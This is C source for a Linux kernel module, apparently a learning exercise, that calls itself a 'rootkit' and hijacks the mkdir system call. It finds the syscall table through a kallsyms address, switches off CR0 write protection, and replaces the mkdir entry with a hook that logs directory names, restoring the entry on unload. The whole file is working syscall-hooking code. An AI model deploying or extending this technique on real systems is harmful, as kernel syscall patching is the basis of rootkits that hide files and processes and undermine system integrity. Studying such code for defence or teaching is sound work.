/*includes*/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/delay.h>
#include <linux/mm.h>        
#include <linux/highmem.h>  


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ruth");
MODULE_VERSION("0.01");


/**
 * Getting syscall table address based on described in DW114-3-SyscallHijacking.pdf (@DanielNiv)
*/
unsigned long kallsyms_lookup_addr;
module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
unsigned long (*kallsyms_lookup_func)(const char *name);
unsigned long *sys_call_table;



static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    orig_mkdir(pathname, mode);
    return 0;
}



static int __init example_init(void)
{
	kallsyms_lookup_func = (void*) kallsyms_lookup_addr;
        sys_call_table = (unsigned long*)(*kallsyms_lookup_func)("sys_call_table");
    

        write_cr0(read_cr0() & (~ 0x10000));
        printk(KERN_INFO "Turn off write protect\n");    
	
	orig_mkdir = (void*) sys_call_table[__NR_mkdir];

	sys_call_table[__NR_mkdir] = (unsigned long)hook_mkdir;
	write_cr0(read_cr0() | 0x10000);
    	printk(KERN_INFO "Turn on write protect\n");

        return 0;
}

static void __exit example_exit(void)
{
	write_cr0(read_cr0() & (~ 0x10000));
        printk(KERN_INFO "Turn off write protect\n");
        sys_call_table[__NR_mkdir] = (unsigned long)orig_mkdir;
	write_cr0(read_cr0() | 0x10000);
        printk(KERN_INFO "Turn on write protect\n");

}

module_init(example_init);
module_exit(example_exit);

